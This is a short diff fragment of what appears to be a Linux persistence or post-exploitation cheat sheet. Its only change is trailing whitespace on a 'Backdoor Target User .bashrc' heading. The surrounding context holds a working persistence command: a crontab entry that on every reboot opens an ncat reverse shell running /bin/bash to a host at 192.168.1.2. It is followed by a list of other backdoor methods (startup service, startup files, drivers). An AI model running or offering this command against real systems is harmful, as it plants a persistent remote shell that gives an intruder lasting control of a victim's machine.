@@ -721,7 +721,7 @@ $ export –f /usr/sbin/service
 
 		- (crontab -l; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e  /bin/bash")|crontab 2> /dev/null 
 
-	- Backdoor Target User .bashrc
+	- Backdoor Target User .bashrc 
 	- Backdoor Startup Service
 	- Backdoor Target User Starup File
 	- Backdoor Driver
